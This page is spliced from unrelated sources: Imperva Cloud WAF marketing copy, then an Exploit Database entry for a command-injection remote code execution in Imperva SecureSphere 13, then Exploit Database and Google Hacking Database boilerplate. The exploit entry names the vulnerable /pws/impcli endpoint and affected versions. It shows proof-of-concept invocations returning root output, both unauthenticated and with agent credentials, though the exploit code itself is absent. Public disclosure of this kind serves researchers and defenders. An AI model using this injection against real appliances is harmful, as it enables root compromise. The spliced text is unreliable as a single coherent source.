![](https://www.imperva.com/products/wp-content/uploads/sites/11/2024/10/WAF-efficacy.png)

## High security efficacy

False positives can trap organizations in a dilemma between blocking legitimate traffic or indefinitely monitoring threats. Imperva Research Labs delivers unparalleled precision, allowing customers to confidently block threats as the security landscape shifts. Over 90% of our clients use blocking mode, bolstered by automated policies and rapid rule updates. This empowers security teams to safely utilize third-party code while keeping pace with DevOps.

![](https://www.imperva.com/products/wp-content/uploads/sites/11/2024/10/WAF-managed-rules.png)

## Proactive managed rules

Imperva Threat Research experts continuously identify new threats from common attack vectors like SQL injection and XSS, create and test new rules in production and proactively push them to you, so you don’t have to spend time creating your own custom rules. Regular daily updates and real-time updates for critical threats assure you have the most up-to-date protection, reducing the burden on security teams to research new threats and manually create rules.

![](https://www.imperva.com/products/wp-content/uploads/sites/11/2024/10/WAF-attacks-blocking.png.webp)

## Deploy in block mode, in minutes

With out-of-the-box rules that have been tested in production environments, Imperva can be deployed in blocking mode from the start. In fact, over 90% of customers deploy in blocking mode. As a SaaS solution it is easy to deploy and manage all your sites behind one solution and one dashboard. If your team is large or small, Cloud WAF can help protect your applications in public, private, or hybrid cloud infrastructures.

![](https://www.imperva.com/products/wp-content/uploads/sites/11/2024/10/WAF-security-alerts-context.png.webp)

## Security incidents with context

Imperva’s Attack Analytics automatically correlates thousands of security alerts into easily digestible narratives. By leveraging advanced machine learning, it provides unified visibility and contextual information about each incident, including attack origin, methods, and severity. This reduces alert fatigue and empowers security teams to respond quickly and accurately​ to the attacks that matter most.

![](https://www.imperva.com/products/wp-content/uploads/sites/11/2024/10/Terraform-diagram-white.png.webp)

## Automated deployment, configuration, and management

Imperva’s Terraform provider automates Cloud WAF deployments. Through a modular design, Imperva’s Terraform module simplifies complex configurations, enabling teams to manage resources across various environments with greater efficiency. This approach enhances security operations and accelerates deployment times by leveraging modern Infrastructure as Code (IaC) practices​.

# Title: Imperva SecureSphere 13 - Remote Command Execution
# Author: rsp3ar
# Date: 2018-10-08
# Vendor: https://www.imperva.com/products/securesphere/
# CVE: N/A
# Version: 13.0.10, 13.1.10, 13.2.10
# Tested on: SecureSphere (Virtual Appliance)

# Description
# PWS is a component in SecureSphere v13, which consists of Python CGIs to expose various cli utilities over https.
# The Python CGIs didn't properly sanitize user supplied command parameters, leading to command injection.
# The vulnerability could be exploited in below ways (depending on configuration status of SecureSphere):

# 1. Unauthenticated Remote Code Execution (Pre-FTL mode)
# When SecureSphere VM is provisioned without running 'ftl' utility to configured into SOM/MX/Gateway mode,
# the vulnerable endpoint could be reached without authentication:

# $ python poc.py -t 192.168.146.201 'sudo id'
# [*] Sending payload to https://192.168.146.201/pws/impcli...
# [*] Received command execution output:
# uid=0(root) gid=0(root) groups=0(root)

# 2. Authenticated Remote Code Execution (Gateway mode)
# When SecureSphere VM is configured as gateway mode via 'ftl' utility, the vulnerable endpoint
# could be reached with valid agent registration credential for user 'imperva':

# $ python poc.py -t 192.168.146.201 -p 'agent_registration_password' 'sudo id'
# [*] Sending payload to https://192.168.146.201/pws/impcli...
# [*] Received command execution output:
# uid=0(root) gid=0(root) groups=0(root)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
